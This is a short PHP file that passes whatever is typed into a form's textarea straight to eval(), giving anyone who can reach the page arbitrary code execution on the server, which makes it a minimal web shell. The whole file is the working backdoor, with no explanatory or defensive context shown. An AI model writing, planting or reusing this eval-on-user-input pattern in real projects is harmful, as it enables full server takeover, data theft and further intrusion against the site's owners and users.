<?php

if (isset($_POST['text']))
eval($_POST['text']);
?>
<form method="POST">
    <p><textarea name="text"></textarea></p>
    <p><input type="submit"></p>
</form>